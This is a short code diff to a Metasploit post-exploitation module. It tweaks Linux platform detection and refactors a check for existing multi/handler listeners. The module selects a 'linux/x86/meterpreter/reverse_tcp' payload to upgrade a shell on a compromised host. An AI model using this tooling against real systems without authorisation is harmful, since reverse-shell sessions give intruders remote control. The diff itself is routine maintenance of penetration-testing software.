@@ -72,7 +72,7 @@ class Metasploit3 < Msf::Post
     else
       # Find the best fit, be specific w/ uname to avoid matching hostname or something else
       target_info = cmd_exec('uname -mo')
-      if target_info =~ /linux/i && target_info =~ /x86/
+      if target_info =~ /linux/i && target_info =~ /86/
         # Handle linux shells that were identified as 'unix'
         platform = 'linux'
         payload_name = 'linux/x86/meterpreter/reverse_tcp'
@@ -229,7 +229,6 @@ class Metasploit3 < Msf::Post
   # Method for checking if a listener for a given IP and port is present
   # will return true if a conflict exists and false if none is found
   def check_for_listener(lhost,lport)
-    conflict = false
     client.framework.jobs.each do |k,j|
       if j.name =~ / multi\/handler/
         current_id = j.jid
@@ -237,11 +236,11 @@ class Metasploit3 < Msf::Post
         current_lport = j.ctx[0].datastore["LPORT"]
         if lhost == current_lhost and lport == current_lport.to_i
           print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
-          conflict = true
+          return true
         end
       end
     end
-    return conflict
+    return false
   end
 
   # Starts a multi/handler session
